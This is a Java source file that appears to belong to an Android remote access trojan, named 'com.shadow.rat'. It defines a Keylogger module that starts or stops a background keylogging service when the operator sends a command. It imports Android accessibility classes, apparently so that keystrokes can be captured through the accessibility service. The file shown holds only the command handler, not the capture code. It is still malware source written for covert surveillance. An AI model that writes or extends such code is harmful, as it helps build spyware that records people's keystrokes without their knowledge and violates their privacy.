package com.shadow.rat.modules;

import android.content.Context;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.shadow.rat.services.KeyloggerService;

public class Keylogger implements Module {

    private final Context context;

    public Keylogger(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("start")) {
            KeyloggerService.start(context);
            return "Keylogger started.";
        } else if (command.equalsIgnoreCase("stop")) {
            KeyloggerService.stop(context);
            return "Keylogger stopped.";
        }
        return "Unknown command for Keylogger. Available commands: start, stop";
    }
}
